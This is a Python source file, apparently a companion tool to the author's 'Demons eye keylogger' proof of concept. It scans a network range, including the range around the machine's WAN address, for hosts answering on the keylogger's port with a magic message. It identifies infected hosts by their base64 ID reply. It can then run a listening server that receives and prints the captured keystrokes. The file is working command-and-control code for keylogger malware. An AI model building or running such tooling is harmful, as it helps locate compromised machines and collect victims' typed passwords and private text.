#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# -----------------------------------------------------------------------------------------------------------
# Name:             pscan.py
# Purpose:          Python Multithread Network Scanner
#                   Search for open ports in a network range.
#                   Based on the demonseye-net-search.py module from my "Demons eye keylogger" keylogger poc
#                   https://github.com/gabimarti/Demons-eye-keylogger
#                   a small server can be activated to receive the keys.
#
# Author:           Gabriel Marti Fuentes
# email:            gabimarti at gmail dot com
# GitHub:           https://github.com/gabimarti
# Created:          20/08/2020
# License:          GPLv3
# Version:          0.0.1
# -----------------------------------------------------------------------------------------------------------


import argparse
import base64
import ipaddress
import msvcrt
import socket
import sys
import threading
import time
import urllib.request

########################################################
# CONSTANTS
########################################################
APPNAME = 'Python Multithread Network Scanner'                      # Just a name
VERSION = 'v0.0.1'                                                  # Version
KEYLOGGER_PORT = 6666                                               # Port of keylogger
DEFAULT_SERVER_PORT = 7777                                          # Port to receive response after connect
SERVER_ACCEPT_TIMEOUT = 0.1
HOST_BIND = ''                                                      # Bind address to listen server (any)
MAX_CLIENTS = 10                                                    # Number of keyloggers to listen
PORT_LIST_SCAN = [KEYLOGGER_PORT]                                   # List of ports to Scan. For testing multiple ports
MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='      # Message to indentify to keylogger
BUFFER_SIZE = 4096                                                  # Buffer size
DEFAULT_TIMEOUT = 2                                                 # Default Timeout (seconds)
DEFAULT_NO_WAIT_RESPONSE = False                                    # No Wait response after sending message
ENCODING = 'utf-8'                                                  # Encoding for message sended
VERBOSE_LEVELS = ['low', 'a bit', 'insane debug']                   # Verbose levels
DEMONS_EYE_ID = 'D3Y3K3YL0G'                                        # Keylogger ID in response


########################################################
# VARIABLES
########################################################
threadList = []                                         # List of active threads
verbose = 0                                             # Verbosity disabled, enabled
net_range = ''                                          # Network Range to scan, if not provided, it detects itself
port_list = []                                          # Port list for command line test
timeout = DEFAULT_TIMEOUT                               # Timeout on port connection
total_threads_launched = 0                              # Total threads launched
total_current_threads_running = 0                       # Total threads running at one moment
max_concurrent_threads = 0                              # Store max concurrent threads
keyloggers_found = False                                # If keylogger is found
listen_server_enabled = False                           # Is listen Server Enabled?
listen_server_instance = None                           # Listen server object


########################################################
# CLASSES
########################################################

# Server Class to receive Data form Demon's Eye Keylogger
class ListenServer(threading.Thread):
    def __init__(self, host_bind, listen_port, max_clients, max_buffer_size):
        threading.Thread.__init__(self)
        self._host_bind = host_bind                         # Interface to listen (blank, all)
        self._server_port = listen_port                     # Listen port
        self._max_clients = max_clients                     # Max number of keloggers to receive information
        self._max_buffer_size = max_buffer_size             # Max buffer size
        self._server_socket = None                          # This server socket
        self._server_running = False                        # Control for shutdown server
        self.client_thread_list = []                        # List of current clients
        self.clients_processed = 0                          # Counter of clients processed (only for statistics)

    def kill_server(self):
        self._server_running = False


    def client_thread(self, conn, ip, port, buffer_size):
        print('Connection from {}:{:5d}'.format(ip, port))
        while self._server_running:
            # The input is in bytes, so decode it
            input_from_client_bytes = conn.recv(self._max_buffer_size)

            # Prints received chars
            print(input_from_client_bytes.decode(ENCODING), end='')

        conn.close()


    def run(self):
        # Create socket and bind to local host and port
        try:
            self._server_socket: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind((self._host_bind, self._server_port))
        except Exception as e:
            print('ListenServer, Creating Socket Exception : {}'.format(e))
            return

        # Start listening on socket
        self._server_socket.settimeout(SERVER_ACCEPT_TIMEOUT)
        self._server_socket.listen(self._max_clients)
        self._server_running = True
        while self._server_running:
            try:
                (conn, (ip, port)) = self._server_socket.accept()   # Wait to accept a connection - NO blocking call
            except socket.timeout:
                pass  # ignore timeout, next accept
            except Exception as e:
                print('Se ha dejado de recibir datos del Keylogger. Excepcion {} '.format(e))
                break                                               # Possibly closed server
            else:
                self.clients_processed += 1
                try:
                    client = threading.Thread(target=self.client_thread,
                                              args=(conn, ip, port, self._max_buffer_size))
                    client.start()
                except Exception as e:
                    print('ListenServer, Client Listen Error : {}'.format(e))

        # Wait to finish threads (Is it necessary? I'm not sure)
        for client in self.client_thread_list:
            client.join()


# Scan a host (ip), for open ports in port_list. Sends a message to host and wait response to identify Keylogger.
# Can activate more verbosity for errors and control messages, and define a timeout for connection.
class HostScan(threading.Thread):
    def __init__(self, ip, port_list, message, verbose, timeout, waitresponse):
        threading.Thread.__init__(self)
        self.open_ports = []
        self.ports = port_list                              # All ports can be self.ports = range(1, 0xffff + 1)
        self.ip = ip                                        # ip to scan
        self.message = message                              # message to send
        self.threads = []                                   # Thread list
        self.verbose = verbose                              # Verbose
        self.timeout = timeout                              # Timeout - alternative: socket.setdefaulttimeout(timeout)
        self.wait = waitresponse                            # wait response after send message
        self.lock = threading.Lock()                        # thread lock

    def scan(self, host, port):
        global total_threads_launched, total_current_threads_running, max_concurrent_threads, keyloggers_found

        # Increment running threads counter and max concurrent threads
        self.lock.acquire()
        total_threads_launched += 1
        total_current_threads_running += 1
        if total_current_threads_running > max_concurrent_threads:
            max_concurrent_threads = total_current_threads_running
        self.lock.release()

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # ipv4 (AF_INET) tcp (SOCK_STREAM)
            s.settimeout(self.timeout)                                  # Sets timeout
            s.connect((host, port))
            try:
                if len(str(self.message)) > 0:
                    if self.verbose >= 1:
                        print('Sending message %s to %s:%s ' % (self.message, host, port))
                    s.send(self.message.encode(ENCODING))
                    if self.wait:
                        response = s.recv(BUFFER_SIZE).decode(ENCODING)
                        # Decode if Base64
                        try:
                            response = str(base64.b64decode(response), ENCODING)
                            # Keylogger Found
                            if response[:len(DEMONS_EYE_ID)] == DEMONS_EYE_ID:
                                keyloggers_found = True
                                response += ' [Keylogger Found]'
                        except Exception as e:
                            if self.verbose >= 2:
                                print('Error decoding Base64 : {}'.format(e))
                    else:
                        response = ''
                else:
                    response = ''
            except Exception as e:
                response = '[No Response]'
                if self.verbose >= 2:
                    print('No response : %s ' % e)
            finally:
                self.open_ports.append('Host %s Port %s [Open] %s' % (host, port, response))
        except Exception as e:
            if self.verbose >= 2:
                print('Host %s Port %d Exception %s ' % (host, port, e))
            pass
        finally:
            s.close()

        # Decrement running threads counter
        self.lock.acquire()
        total_current_threads_running -= 1
        self.lock.release()

    def write(self):
        for op in self.open_ports:
            print(op)

    def run(self):
        self.threads = []
        if self.verbose >= 2:
            print('Start scan ' + str(self.ip))
        # Enumerate ports list and scan and add to thread
        for i, port in enumerate(self.ports):
            s = threading.Thread(target=self.scan, args=(self.ip, port))
            s.start()
            self.threads.append(s)

        # Finish threads before main thread starts again
        for thread in self.threads:
            thread.join()

        # Write out the ports that are open
        self.write()


# Scan a range of IPs for open ports
# Get CIDR net_gange, List of port_list, message to send, verbosity
class RangeScan(threading.Thread):
    def __init__(self, net_range, port_list, message, verbose, timeout, waitresponse):
        threading.Thread.__init__(self)
        self.active_hosts = []                                      # IP Host list with at least one open port
        self.ip_net = ipaddress.ip_network(net_range)               # Create the network
        self.all_hosts = list(self.ip_net.hosts())                  # Generate all hosts in network
        self.port_list = port_list                                  # List of ports to scan
        self.message = message                                      # Message to send
        self.threads = []                                           # Thread list
        self.verbose = verbose                                      # Verbose
        self.own_host = socket.gethostname()                        # Client Host name
        self.own_ip = socket.gethostbyname(self.own_host)           # Client Host ip
        self.timeout = timeout                                      # Timeout
        self.wait = waitresponse
        self.hosts_scanned = 0                                      # Total hosts scanned

    def start(self):
        if self.verbose >= 2:
            print('This host is %s (%s) ' % (self.own_host, self.own_ip))

        self.hosts_scanned = 0
        for ip in self.all_hosts:                                   # Scan the network range
            # Thread host port scan
            hs = HostScan(str(ip), self.port_list, self.message, self.verbose, self.timeout, self.wait)
            hs.start()
            self.threads.append(hs)
            self.hosts_scanned += 1

        # Wait to finish threads before main thread starts again
        for thread in self.threads:
            thread.join()


########################################################
# FUNCTIONS
########################################################

# Get the external ip
def get_external_ip():
    external_ip = urllib.request.urlopen('https://ident.me').read().decode(ENCODING)
    return external_ip


# Convert an ip to a CIDR / 24 range
def ip_to_cidr24(ip_to_convert):
    blist = ip_to_convert.split('.')        # split bytes
    blist[3] = '0'                          # changes last byte
    cidr = '.'
    cidr = cidr.join(blist)                 # collect the bytes again
    cidr += '/24'                           # adds mask
    return cidr


# Parse command line parameters
def parse_params():
    parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
                                     epilog='You can also use it to scan specific ports on a network.')
    parser.add_argument('-r', '--range', type=str, default="",
                        help='Specify the network range in CIDR format. ' +
                             'If not provided, an attempt is made to autodetect a local class C range. ' +
                             'Example: 192.168.1.0/24')
    parser.add_argument('-w', '--wanauto', action='store_true', default=False,
                        help='If this option is set (and no -r has been specified), ' +
                             'an automatic class C range will be set for the current Wan IP.')
    parser.add_argument('-p', '--ports', type=int, nargs='+', default=list(PORT_LIST_SCAN),
                        help='Specify a list of ports to scan. Default value: ' + str(PORT_LIST_SCAN))
    parser.add_argument('-m', '--message', type=str, default=MAGIC_MESSAGE,
                        help='Message to send to host. If empty (-m \'\'), then not message is sent. Default value: ' +
                             MAGIC_MESSAGE)
    parser.add_argument('-n', '--nowaitresponse', action='store_true', default=DEFAULT_NO_WAIT_RESPONSE,
                        help='NO wait response from host after sending Message (if sent). Default value: ' +
                             str(DEFAULT_NO_WAIT_RESPONSE))
    parser.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT,
                        help='Timeout in seconds on port connection. Default value: ' + str(DEFAULT_TIMEOUT))
    parser.add_argument('-e', '--enableserver', action='store_true', default=False,
                        help='Enable Server to receive Demon\'s Eye Keylogger Data')
    parser.add_argument('-s', '--serverport', type=int, default=DEFAULT_SERVER_PORT,
                        help='If the keylogger is found (wait response is necessary), it establishes a server to '
                             'receive data. Default value: ' + str(DEFAULT_SERVER_PORT))
    parser.add_argument('-v', '--verbose', type=int, choices=[0,1,2], default=0,
                        help='Increase output verbosity. Default value: 0')
    args = parser.parse_args()
    return args


def main():
    global listen_server_instance, listen_server_enabled

    # Check and parse parameters
    args = parse_params()
    verbose = args.verbose
    net_range = args.range
    wan_auto = args.wanauto
    port_list = args.ports
    message = args.message
    waitresponse = not args.nowaitresponse
    timeout = args.timeout
    enable_server = args.enableserver
    server_port = args.serverport

    # Host info
    hostname = socket.gethostname()
    localip = socket.gethostbyname(hostname)
    externalip = get_external_ip()

    print(APPNAME + ' ' + VERSION)
    print('==============================================')
    print('Verbose level '+str(VERBOSE_LEVELS[verbose]))
    if net_range == "" and not wan_auto:
        net_range = ip_to_cidr24(localip)
        print('Network range to scan (local autodetect) ' + net_range)
    elif net_range == "" and wan_auto:
        net_range = ip_to_cidr24(externalip)
        print('Network range to scan (wan autodetect) ' + net_range)
    else:
        print('Network range to scan '+net_range)
    print('Ports list '+str(port_list))
    print('Message to send \''+message+'\'')
    print('Wait response after send message '+str(waitresponse))
    print('Timeout %d seconds' % (timeout))
    if enable_server:
        print('Enabled Server to receive Keylogger Data at port %s' % server_port)
        try:
            listen_server_instance = ListenServer(HOST_BIND, server_port, MAX_CLIENTS, BUFFER_SIZE)
            listen_server_instance.start()
            listen_server_enabled = True
        except Exception as e:
            print('Error starting Server {}'.format(e))
            sys.exit(1)

    print('---')
    print('This Host %s : IP local %s : IP wan %s' % (hostname, localip, externalip))
    print('Scanning ...')
    start = time.perf_counter()
    scanner = RangeScan(net_range, port_list, message, verbose, timeout, waitresponse)
    scanner.start()
    total_hosts = scanner.hosts_scanned
    total_time = time.perf_counter() - start
    print('Scanned %d hosts at %s in %6.2f seconds ' % (total_hosts, args.range, total_time))
    print('Total %d threads launched, and max simultaneous was %d threads' % (total_threads_launched, max_concurrent_threads))
    if total_current_threads_running > 0:
        print('Something strange happes because the threads running is %d ' % (total_current_threads_running))

    # No keylogger found
    if enable_server and keyloggers_found == False:
        print('No Keyloggers found. Disabling Server...')
        enable_server = False
        listen_server_instance.kill_server()
        listen_server_instance = None
        listen_server_enabled = False

    # Listen Server
    while enable_server and listen_server_enabled:
        if listen_server_instance is not None:
            print('Socket is Listening at {}:{}...'.format(hostname,server_port))
            # key = input('Enter "Q" o "q" to Exit : ').strip()
            key = msvcrt.getch()
            if key == b"Q" or key == b"q":
                listen_server_instance.kill_server()
                listen_server_instance = None
                listen_server_enabled = False
                print('Exiting.')
                break


if __name__ == '__main__':
    main()

